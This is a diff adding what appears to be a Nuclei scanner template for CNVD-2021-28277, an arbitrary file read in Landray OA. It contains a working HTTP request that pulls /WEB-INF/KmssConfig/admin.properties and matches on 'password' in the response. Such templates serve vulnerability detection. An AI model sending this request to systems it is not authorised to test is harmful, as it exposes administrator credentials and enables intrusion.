@@ -1,0 +1,30 @@
+id: CNVD-2021-28277
+
+info:
+  name: 蓝凌OA(Landray) - 任意文件读取(CNVD-2021-28277)
+  author: wintry
+  severity: critical
+  description: Landray-OA 存在任意文件读取漏洞.
+  tags: landray
+  
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "password"
+          - "kmss"
+        condition: and
+
+      - type: status
+        status:
+          - 200
